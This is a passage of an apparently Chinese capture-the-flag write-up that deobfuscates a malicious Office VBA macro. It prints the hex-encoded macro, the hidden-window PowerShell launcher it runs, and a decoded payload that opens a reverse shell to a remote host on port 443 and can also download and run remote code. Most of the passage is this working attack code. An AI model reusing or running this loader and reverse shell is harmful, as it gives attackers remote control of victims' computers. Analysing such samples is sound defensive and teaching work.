ytahenomter(&quot;774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d&quot;) &amp; ytahenomter(&quot;774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d&quot;)
moabehina &#x3D; ytahenomter(&quot;774264414649415151426f41474d4157774264414563416267424a414649415641427a414673414c41416e4148514157414271414363414b41426c41474d415151424d&quot;) &amp; ytahenomter(&quot;4146414152514253414334414b51416e414351414a774173414363416477427841476b414a77416f41475541517742424145774155414246414649414c674170414363414f774230414667414a774172414363416167427a41474d&quot;) &amp; _
ytahenomter(&quot;414d41426b414638415a41417a4147774159674130414734414d&quot;) &amp; _
ytahenomter(&quot;774266414441416367426a414451416251416e414373414a774237414763414a774172414363415951416e414373414a774273414759416441425941476f414941416e414373414a774139414445415877426e414745414a774172414363416241426d4148634163514270414363414b414169414377414a774175414363414c414167414363415567416e414373414a77427041456341534142554148514154774273414363414b77416e414755415a674230414363414941417041434141664141674147594162774279414555415151426a414567414c514276414549415367426c41474d&quot;) &amp; _
ytahenomter(&quot;4156414167414873414a41426641433441566742424145774156514246414830414941417041436b4149414170414473414451414b41464d&quot;) &amp; _
ytahenomter(&quot;4152514230414341414b414169414563414f414169414373414967426f414349414b5141674143674149414169414341414b51416741436b414e67417a41463041556742684147674159774262414377414a774279414745415767416e4145554159774268414777415541426c414649414c514167414451414d&quot;)
hujilkomna &#x3D; ytahenomter(&quot;774264414649415951426f41474d415777417341436b414d&quot;) &amp; ytahenomter(&quot;41413141463041556742684147674159774262414373414f41413341463041556742684147674159774262414373414f5141304146304155674268414767415977426241436741494141674147554151774242414777416341424641464941597741744143414149414170414363414f774179414363414b77416e414534414a774172414363414d&quot;) &amp; _
ytahenomter(&quot;51416e414373414a77423941484d4164514177414849414d77426e414363414b77416e414734414e41426b414638414d774279414451414a7741724143634158774179414534414d&quot;) &amp; _
ytahenomter(&quot;5141674144304149414179414638415a774268414363414b77416e414777415a674279414363414b77416e414745415767416e414367414b4141674143674149414170414363414a77427541476b4154774271414330414a774234414363414b77426441444d&quot;)
tuabnimne &#x3D; ytahenomter(&quot;414c414178414673414b51416f414563415467427041484941564142544147384164414175414555415977424f414755416367426c414559415a514253414841415251427a4145384151674253414555416467416b414341414b41416741433441494141694143414149414170414341414f77417441476f415477424a414734414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d&quot;) &amp; _
ytahenomter(&quot;414855415a514262414341414c514167414445414c674175414341414c514167414367414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d&quot;) &amp; _
ytahenomter(&quot;414855415a514175414577415a514275414763416441424941436b4158514167414877414941424a414755415741414e41416f414a4142774147454165514273414738415951426b414341415051416741434941536742424145494161674242414563416477424241474541555142434147774151514248414451415151426b414545415151426e414545415241417741454541535142424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d&quot;) &amp; _
ytahenomter(&quot;41424241454d415151424241465541647742434144554151514249414530415151426b41454541516742734145454152774177414545415441426e414549415477424241456341565142424147514151514242414855415151424741453041515142694148634151674271414545415277427a4145454157674252414549414d&quot;) &amp; _
ytahenomter(&quot;4142424145674154514242414577415a774243414655415151424641453041515142564145454151674245414545415277423341454541595142524145494162414242414563414e4142424147514151514242414738415151424441456b415151424e4146454151514131414545415241424a414545415441426e414545416477424241454d&quot;)
wuotamw &#x3D; ytahenomter(&quot;414e414242414530415a7742424148554151514245414555415151424e4148634151514235414545415177424a4145454154414242414545414d&quot;) &amp; ytahenomter(&quot;41424241455141555142424145304164774242414841415151424541484d&quot;) &amp; _
ytahenomter(&quot;415151424b41454541516742364145454153414252414545415977426e4145494162414242414563415251424241474941555142424147634151514245414441415151424a4145454151514272414545415277424e414545415967424241454941634142424145634156514242414749415a77424341444141515142444144514151514253414863415167427341454541534142524145454156514233414549414d&quot;) &amp; _
ytahenomter(&quot;414242414567415351424241466f41555142434147674151514248414441415151424c4145454151514277414545415241427a4145454156774233414549416151424241456741617742424147514151514243414777415151424741484d&quot;) &amp; _
ytahenomter(&quot;4151514259414645415167426b4145454151774252414545415751426e414549414e514242414567415551424241466f415551424341486f41515142444145454151514251414645415151426e4145454152414242414545415441426e4145454164514242414551415751424241453441555142424144454151514245414530415151424f41464541516741344145454151774256414545415a5142334145454164774242414567414d&quot;) &amp; ytahenomter(&quot;414242414538416477424341444d&quot;)
sjeldmajek &#x3D; ytahenomter(&quot;41515142484147634151514268414645415167427a41454541527742564145454153774242414545416277424241454d&quot;) &amp; _
ytahenomter(&quot;415551424241474541555142424147634151514245414441415151424a4145454151514272414545415341424e414545415a4142424145494165514242414563415651424241466b415551424341485141515142444144514151514256414763415167427341454541527742464145454157674242414545416277424241454d&quot;) &amp; _
ytahenomter(&quot;415551424241466b415a77424341445541515142494146454151514261414645415167423641454541517742334145454153514242414545416477424241454d&quot;) &amp; _
ytahenomter(&quot;416477424241456b4151514242414773415151424841456b415151426c4146454151674177414545415277425641454541597742334145454164514242414555416477424241466f4155514243414855415151424841474d&quot;) &amp; ytahenomter(&quot;415151426b414545415167427641454541517742724145454153774252414545415a77424241454d414d&quot;) &amp; _
ytahenomter(&quot;414242414749415a7742434147774151514244414545415151424e4145454151514277414545415341427a41454541547742334145454161774242414563415551424241466b41555142434144414151514248414555415151424a4145454151514135414545415177424241454541537742424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d&quot;)
afsyedlmen &#x3D; ytahenomter(&quot;41424241454d415151424241457741555142434146554151514249414773415151426a4145454151674273414545415251413041454541575142524145494164414242414563415651424241456b41515142434146514151514249414773415151426a4148634151674177414545415277425641454541596742524145454164514242414559415551424241466f41555142434144514151514249414645415151424d&quot;) &amp; ytahenomter(&quot;4147634151674243414545415267424e41454541555142334145494153674242414555416177424241464941555142434148554151514248414530415151426941486341516742724145454152774272414545415967426e414549416267424241454d&quot;) &amp; _
ytahenomter(&quot;4161774242414577415a7742434145674151514248414655415151426b41454541516742554145454153414252414545415977426e4145494163414242414563414e41424241466f41647742424147384151514244414645415151425a414763415167413141454541534142524145454157674252414549416567424241454d&quot;) &amp; _
ytahenomter(&quot;4164774242414530415151424241484d4151514244414545415151424b4145454151674277414545415177427241454541547742334145454161774242414567415451424241466f41555142434148554151514248414645415151425a414763415167426f414545415277424e4145454159514233414545415a774242414551414d&quot;) &amp; _
ytahenomter(&quot;41424241456b4151514242414738415151424841477341515142614146454151674130414545415177424241454541536742424145494161774242414563415251424241475141515142434147674151514244414545415151424e4147634151514172414545415177425a4145454154514252414545415a774242414567416477424241456b41515142434146414151514249414655415151426b4145454151514230414545415267424e414545415a41424241454941655142424145634161774242414749415a7742434147344151514244414545415151424c4146454151514133414545415177425241454541597742334145494162414242414563414e41424241466f415151424341476b4151514248414555415151425a4148634151674279414545415241424a4145454153514242414545415a774242414551414d&quot;) &amp; _
ytahenomter(&quot;41424241456b41515142424147734151514249414530415151426141464541516742314145454152774252414545415751426e414549416141424241456341545142424147454164774242414763415151424441484d&quot;) &amp; _
ytahenomter(&quot;415151424a414545415151427041454541526742424145454156514233414545415a77424241454d415351424241456b41515142424148494151514244414545415151424c4145454151674233414545415341426a4145454157674242414545416341424241454d&quot;) &amp; _
ytahenomter(&quot;414e414242414655415151424341476741515142494146454151514268414545415151426e414545415177427a41454541535142424145454161514242414551414e41424241456b415151424241476b415151424541484d&quot;) &amp; _
ytahenomter(&quot;415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424a4145454151514135414545415177424241454541537742424145494159674242414567415551424241466f41555142434144514151514249414645415151424d&quot;)
eujrtabem &#x3D; ytahenomter(&quot;414763415167427341454541527741304145454157514233414549416467424241456341555142424147454155514243414855415151424841474d&quot;) &amp; ytahenomter(&quot;41515142594146454151514132414545415241427641454541555142524145494156414242414555415451424241464d&quot;) &amp; _
ytahenomter(&quot;415551424341456f4151514244414773415151424d&quot;) &amp; _
ytahenomter(&quot;41476341516742494145454152774256414545415a4142424145494151774242414567416177424241475141515142434147774151514249414530415151424c4145454151514272414545415341424e41454541576742524145494164514242414563415551424241466b415a7742434147674151514248414530415151426841486341515142354145454151774272414545415477423341454541617742424145674154514242414751415151424341486b4151514248414655415151425a4146454151674230414545415177413041454541566742334145494165514242414563416177424241475141515142434147774151514244414763415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424d&quot;) &amp; _
ytahenomter(&quot;41454541515142334145454151774233414545415367424241454941656742424145634156514242414749415a774243414773415151424841456b415151426c41464541516741774145454152774256414545415441426e41454941545142424145634156514242414749415a774243414734415151424941464541515142684145454151514277414545415241427a41454541536742424145494165674242414567415551424241474d&quot;) &amp; _
ytahenomter(&quot;415a774243414777415151424841455541515142694146454151514231414545415251425a4145454159674242414549414d&quot;) &amp; ytahenomter(&quot;514242414567415451424241474541515142424147384151514244414773415151426d4146454151514133414545415177425241454541575142334145494163774242414563416177424241466f41555142434148554151514249414645415151424d&quot;) &amp; _
ytahenomter(&quot;414763415167424541454541527742334145454159674233414549416567424241456341565142424145734151514242414841415151424541484d&quot;) &amp; ytahenomter(&quot;4151514169414130414367416b41474d&quot;) &amp; _
ytahenomter(&quot;4149414139414341415777425441486b41637742304147554162514175414651415a514234414851414c67424641473441597742764147514161514275414763415851413641446f415651427541476b4159774276414751415a514175414563415a51423041464d&quot;) &amp; ytahenomter(&quot;416441427941476b416267426e414367415777425441486b4163774230414755416251417541454d&quot;) &amp; _
ytahenomter(&quot;4162774275414859415a514279414851415851413641446f41526742794147384162514243414745416377426c414459414e4142544148514163674270414734415a77416f414351416341426841486b4162414276414745415a41417041436b414451414b41476b415a674167414367414a4142774147454165514273414738415951426b414341414c514274414745416441426a41476741494141694147674164414230414841414f67423841476741644142304148414163774136414349414b514167414873414451414b4143414149414167414341414a4142774147454165514273414738415951426b4143414150514167414367415467426c414863414c514250414749416167426c41474d&quot;) &amp; _
ytahenomter(&quot;4164414167414349415467426c414851414c674258414755415967426a414777416151426c414734416441416941436b414c6742454147384164774275414777416277426841475141557742304148494161514275414763414b41416b41484141595142354147774162774268414751414b514137414130414367423941413041436742704147554165414167414351415977413741413d3d&quot;)

x &#x3D; Shell(aeythrpom &amp; vultiormen &amp; moabehina &amp; hujilkomna &amp; tuabnimne &amp; wuotamw &amp; sjeldmajek &amp; afsyedlmen &amp; eujrtabem)
End Sub
Private Function ytahenomter(ByVal ncjdmileoa As String) As String
Dim bycamliooa As Long
For bycamliooa &#x3D; 1 To Len(ncjdmileoa) Step 2
ytahenomter &#x3D; ytahenomter &amp; Chr$(Val(&quot;&amp;H&quot; &amp; Mid$(ncjdmileoa, bycamliooa, 2)))
Next bycamliooa
Debug.Print (ytahenomter)
End Function<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>加个监视<code>Debug.Print ()</code></p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -noexit -w hidden -enc  JAB0ACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoAFwAIgB1AHM
AZQByADMAMgAuAGQAbABsAFwAIgApAF0AIABwAHUAYgBsAGkAYwAgAHM
AdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAGkAbgB0ACAAaABhAG4AZABsAGUALAAgAGkAbgB0ACAAcwB0AGEAdABlACkA
OwAnADsADQAKAGEAZABkAC0AdAB5AHAAZQAgAC0AbgBhAG0AZQAgAHcAaQBuACAALQBtAGUAbQBiAGUAcgAgACQAdAAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABuAGEAdABpAHYAZQA7AFsAbgBhAHQAaQB2AGUALgB3AGkAbgBdADoAOgBTAGgAbwB3AFcAaQBuAGQAbwB3ACgAKABbAFM
AeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHM
AcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGM
AZQBzAHMAKAApACAAfAAgAEcAZQB0AC0AUAByAG8AYwBlAHM
AcwApAC4ATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQAsACAAM
AApADsADQAKAGkAZQB4ACAAKAAgAFsAUwB0AHIAaQBuAEcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKABbAHIARQBHAGUAWABdADoAOgBNAGEAVABjAGgAZQBTACgAIAAiACkAIAAnAHgAJwArAF0AM
wAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAM
wAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAM
wBdAFIAQQBoAGMAWwBdAEcAbgBJAFIAVABzAFsALAAnAHQAWABqACcAKABlAGMAQQBM
AFAARQBSAC4AKQAnACQAJwAsACcAdwBxAGkAJwAoAGUAQwBBAEwAUABFAFIALgApACcAOwB0AFgAJwArACcAagBzAGM
AMABkAF8AZAAzAGwAYgA0AG4AM
wBfADAAcgBjADQAbQAnACsAJwB7AGcAJwArACcAYQAnACsAJwBsAGYAdABYAGoAIAAnACsAJwA9ADEAXwBnAGEAJwArACcAbABmAHcAcQBpACcAKAAiACwAJwAuACcALAAgACcAUgAnACsAJwBpAEcASABUAHQATwBsACcAKwAnAGUAZgB0ACcAIAApACAAfAAgAGYAbwByAEUAQQBjAEgALQBvAEIASgBlAGM
AVAAgAHsAJABfAC4AVgBBAEwAVQBFAH0AIAApACkAIAApADsADQAKAFM
ARQB0ACAAKAAiAEcAOAAiACsAIgBoACIAKQAgACgAIAAiACAAKQAgACkANgAzAF0AUgBhAGgAYwBbACwAJwByAGEAWgAnAEUAYwBhAGwAUABlAFIALQAgADQAM
wBdAFIAYQBoAGMAWwAsACkAM
AA1AF0AUgBhAGgAYwBbACsAOAA3AF0AUgBhAGgAYwBbACsAOQA0AF0AUgBhAGgAYwBbACgAIAAgAGUAQwBBAGwAcABFAFIAYwAtACAAIAApACcAOwAyACcAKwAnAE4AJwArACcAM
QAnACsAJwB9AHMAdQAwAHIAMwBnACcAKwAnAG4ANABkAF8AMwByADQAJwArACcAXwAyAE4AM
QAgAD0AIAAyAF8AZwBhACcAKwAnAGwAZgByACcAKwAnAGEAWgAnACgAKAAgACgAIAApACcAJwBuAGkATwBqAC0AJwB4ACcAKwBdADM
ALAAxAFsAKQAoAEcATgBpAHIAVABTAG8AdAAuAEUAYwBOAGUAcgBlAEYAZQBSAHAARQBzAE8AQgBSAEUAdgAkACAAKAAgAC4AIAAiACAAIAApACAAOwAtAGoATwBJAG4AIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBM
AHUAZQBbACAALQAgADEALgAuACAALQAgACgAIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBM
AHUAZQAuAEwAZQBuAGcAdABIACkAXQAgAHwAIABJAGUAWAANAAoAJABwAGEAeQBsAG8AYQBkACAAPQAgACIASgBBAEIAagBBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQBnAEEARAAwAEEASQBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAM
ABBAEMAQQBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATABnAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBiAHcAQgBqAEEARwBzAEEAWgBRAEIAM
ABBAEgATQBBAEwAZwBCAFUAQQBFAE0AQQBVAEEAQgBEAEEARwB3AEEAYQBRAEIAbABBAEcANABBAGQAQQBBAG8AQQBDAEkAQQBNAFEAQQA1AEEARABJAEEATABnAEEAdwBBAEM
ANABBAE0AZwBBAHUAQQBEAEUAQQBNAHcAQQB5AEEAQwBJAEEATABBAEEAM
ABBAEQAUQBBAE0AdwBBAHAAQQBEAHM
AQQBKAEEAQgB6AEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDADQAQQBSAHcAQgBsAEEASABRAEEAVQB3AEIAM
ABBAEgASQBBAFoAUQBCAGgAQQBHADAAQQBLAEEAQQBwAEEARABzAEEAVwB3AEIAaQBBAEgAawBBAGQAQQBCAGwAQQBGAHM
AQQBYAFEAQgBkAEEAQwBRAEEAWQBnAEIANQBBAEgAUQBBAFoAUQBCAHoAQQBDAEEAQQBQAFEAQQBnAEEARABBAEEATABnAEEAdQBBAEQAWQBBAE4AUQBBADEAQQBEAE0AQQBOAFEAQgA4AEEAQwBVAEEAZQB3AEEAdwBBAEgAM
ABBAE8AdwBCADM
AQQBHAGcAQQBhAFEAQgBzAEEARwBVAEEASwBBAEEAbwBBAEM
AUQBBAGEAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAeQBBAEcAVQBBAFkAUQBCAHQAQQBDADQAQQBVAGcAQgBsAEEARwBFAEEAWgBBAEEAbwBBAEM
AUQBBAFkAZwBCADUAQQBIAFEAQQBaAFEAQgB6AEEAQwB3AEEASQBBAEEAdwBBAEM
AdwBBAEkAQQBBAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEAYwB3AEEAdQBBAEUAdwBBAFoAUQBCAHUAQQBHAGM
AQQBkAEEAQgBvAEEAQwBrAEEASwBRAEEAZwBBAEMAM
ABBAGIAZwBCAGwAQQBDAEEAQQBNAEEAQQBwAEEASABzAEEATwB3AEEAawBBAEcAUQBBAFkAUQBCADAAQQBHAEUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAM
ABBAEMAQQBBAEwAUQBCAFUAQQBIAGsAQQBjAEEAQgBsAEEARQA0AEEAWQBRAEIAdABBAEcAVQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEYAUQBBAFoAUQBCADQAQQBIAFEAQQBM
AGcAQgBCAEEARgBNAEEAUQB3AEIASgBBAEUAawBBAFIAUQBCAHUAQQBHAE0AQQBiAHcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEM
AawBBAEwAZwBCAEgAQQBHAFUAQQBkAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBZAGcAQgA1AEEASABRAEEAWgBRAEIAegBBAEM
AdwBBAE0AQQBBAHMAQQBDAEEAQQBKAEEAQgBwAEEAQwBrAEEATwB3AEEAawBBAEgATQBBAFoAUQBCAHUAQQBHAFEAQQBZAGcAQgBoAEEARwBNAEEAYQB3AEEAZwBBAEQAM
ABBAEkAQQBBAG8AQQBHAGsAQQBaAFEAQgA0AEEAQwBBAEEASgBBAEIAawBBAEcARQBBAGQAQQBCAGgAQQBDAEEAQQBNAGcAQQArAEEAQwBZAEEATQBRAEEAZwBBAEgAdwBBAEkAQQBCAFAAQQBIAFUAQQBkAEEAQQB0AEEARgBNAEEAZABBAEIAeQBBAEcAawBBAGIAZwBCAG4AQQBDAEEAQQBLAFEAQQA3AEEAQwBRAEEAYwB3AEIAbABBAEcANABBAFoAQQBCAGkAQQBHAEUAQQBZAHcAQgByAEEARABJAEEASQBBAEEAZwBBAEQAM
ABBAEkAQQBBAGsAQQBIAE0AQQBaAFEAQgB1AEEARwBRAEEAWQBnAEIAaABBAEcATQBBAGEAdwBBAGcAQQBDAHM
AQQBJAEEAQQBpAEEARgBBAEEAVQB3AEEAZwBBAEMASQBBAEkAQQBBAHIAQQBDAEEAQQBLAEEAQgB3AEEASABjAEEAWgBBAEEAcABBAEM
ANABBAFUAQQBCAGgAQQBIAFEAQQBhAEEAQQBnAEEAQwBzAEEASQBBAEEAaQBBAEQANABBAEkAQQBBAGkAQQBEAHM
AQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIAYgBBAEgAUQBBAFoAUQBCADQAQQBIAFEAQQBM
AGcAQgBsAEEARwA0AEEAWQB3AEIAdgBBAEcAUQBBAGEAUQBCAHUAQQBHAGM
AQQBYAFEAQQA2AEEARABvAEEAUQBRAEIAVABBAEUATQBBAFM
AUQBCAEoAQQBDAGsAQQBM
AGcAQgBIAEEARwBVAEEAZABBAEIAQwBBAEgAawBBAGQAQQBCAGwAQQBIAE0AQQBLAEEAQQBrAEEASABNAEEAWgBRAEIAdQBBAEcAUQBBAFkAZwBCAGgAQQBHAE0AQQBhAHcAQQB5AEEAQwBrAEEATwB3AEEAawBBAEgATQBBAGQAQQBCAHkAQQBHAFUAQQBZAFEAQgB0AEEAQwA0AEEAVgB3AEIAeQBBAEcAawBBAGQAQQBCAGwAQQBDAGcAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBM
AEEAQQB3AEEAQwB3AEEASgBBAEIAegBBAEcAVQBBAGIAZwBCAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEATABnAEIATQBBAEcAVQBBAGIAZwBCAG4AQQBIAFEAQQBhAEEAQQBwAEEARABzAEEASgBBAEIAegBBAEgAUQBBAGM
AZwBCAGwAQQBHAEUAQQBiAFEAQQB1AEEARQBZAEEAYgBBAEIAM
QBBAEgATQBBAGEAQQBBAG8AQQBDAGsAQQBmAFEAQQA3AEEAQwBRAEEAWQB3AEIAcwBBAEcAawBBAFoAUQBCAHUAQQBIAFEAQQBM
AGcAQgBEAEEARwB3AEEAYgB3AEIAegBBAEcAVQBBAEsAQQBBAHAAQQBEAHM
AQQAiAA0ACgAkAGM
AIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFM
AdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEM
AbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApACkADQAKAGkAZgAgACgAJABwAGEAeQBsAG8AYQBkACAALQBtAGEAdABjAGgAIAAiAGgAdAB0AHAAOgB8AGgAdAB0AHAAcwA6ACIAKQAgAHsADQAKACAAIAAgACAAJABwAGEAeQBsAG8AYQBkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGM
AdAAgACIATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAAiACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHAAYQB5AGwAbwBhAGQAKQA7AA0ACgB9AA0ACgBpAGUAeAAgACQAYwA7AA&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>转base64</p>
<pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">$t &#x3D; &#39;[DllImport(\&quot;user32.dll\&quot;)] public static extern bool ShowWindow(int handle, int state);&#39;;

add-type -name win -member $t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);

iex ( [StrinG]::join(&#39;&#39;, ([rEGeX]::MaTcheS( &quot;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER.)&#39;$&#39;,&#39;wqi&#39;(eCALPER.)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;&#123;g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;&#x3D;1_ga&#39;+&#39;lfwqi&#39;(&quot;,&#39;.&#39;, &#39;R&#39;+&#39;iGHTtOl&#39;+&#39;eft&#39; ) | forEAcH-oBJecT &#123;$_.VALUE&#125; )) );

SEt (&quot;G8&quot;+&quot;h&quot;) ( &quot; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;&#125;su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 &#x3D; 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . &quot;  ) ;-jOIn ( lS (&quot;VAR&quot;+&quot;IaB&quot;+&quot;LE:g&quot;+&quot;8H&quot;)  ).VALue[ - 1.. - ( ( lS (&quot;VAR&quot;+&quot;IaB&quot;+&quot;LE:g&quot;+&quot;8H&quot;)  ).VALue.LengtH)] | IeX

$payload &#x3D; &quot;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA&quot;

$c &#x3D; [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($payload))

if ($payload -match &quot;http:|https:&quot;) &#123;

    $payload &#x3D; (New-Object &quot;Net.Webclient&quot;).DownloadString($payload);

&#125;

iex $c;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload再解密</p>
